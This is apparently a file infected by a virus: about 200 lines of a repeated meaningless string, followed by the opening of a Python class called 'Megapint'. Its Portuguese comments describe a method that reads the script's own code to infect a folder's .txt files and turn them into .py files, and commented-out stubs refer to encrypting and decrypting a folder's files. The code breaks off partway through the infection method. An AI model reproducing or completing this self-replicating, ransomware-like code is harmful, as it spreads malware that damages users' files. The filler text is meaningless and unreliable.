da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3
da2d98hjd9hw973y4897h929udh1902eh97yf09874hrfo2973y407ho917o2864grto187ego286yg1238ygfoper7so6rgo8264ygf2o3v#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
